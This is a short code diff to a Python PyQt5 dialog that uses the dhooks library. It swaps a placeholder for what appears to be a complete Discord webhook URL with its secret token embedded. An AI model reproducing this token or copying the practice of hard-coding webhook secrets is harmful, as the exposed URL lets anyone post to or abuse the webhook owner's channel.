@@ -1,7 +1,7 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 from dhooks import Webhook, File
 
-webhook_url = Webhook('WEBHOOK TOKEN')
+webhook_url = Webhook('https://discord.com/api/webhooks/919003642714001468/pI2D0xBKYfm13IKuvw1gfDJS-Igsm4rgmnqPn7604Rq9FbaCRyWa1dNaZ7obwrToWevn')
 
 class Ui_Dialog(object):
     def setupUi(self, Dialog):
